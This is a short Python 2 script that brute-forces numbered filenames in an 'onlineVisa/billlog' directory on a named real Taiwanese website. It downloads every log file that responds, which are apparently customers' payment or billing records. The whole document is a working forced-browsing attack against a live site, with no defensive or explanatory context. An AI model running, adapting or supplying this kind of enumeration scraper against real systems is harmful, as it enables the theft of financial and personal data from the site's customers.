#http://www.pfcatv.com.tw/onlineVisa/billlog/458921.log

objTargetUrl = "http://www.pfcatv.com.tw/onlineVisa/billlog/"
import urllib2
from tqdm import tqdm

def run():
	for objLogName in tqdm(range(458921, 1000000)):
		objCrawlUrl = objTargetUrl + str(objLogName) + ".log"
		try:
			conn = urllib2.urlopen(objCrawlUrl)
			if conn.getcode() == 200:
				print("===> %s" %(objCrawlUrl))
				with open(str(objLogName) + ".log", "w") as objTargetLog:
					objTargetLog.write(conn.read())
			else:
				print("%s unknow %s" %(objCrawlUrl, conn.getcode()))
			conn.close()
		except:
			pass
try:
	run()
except KeyboardInterrupt:
	exit()
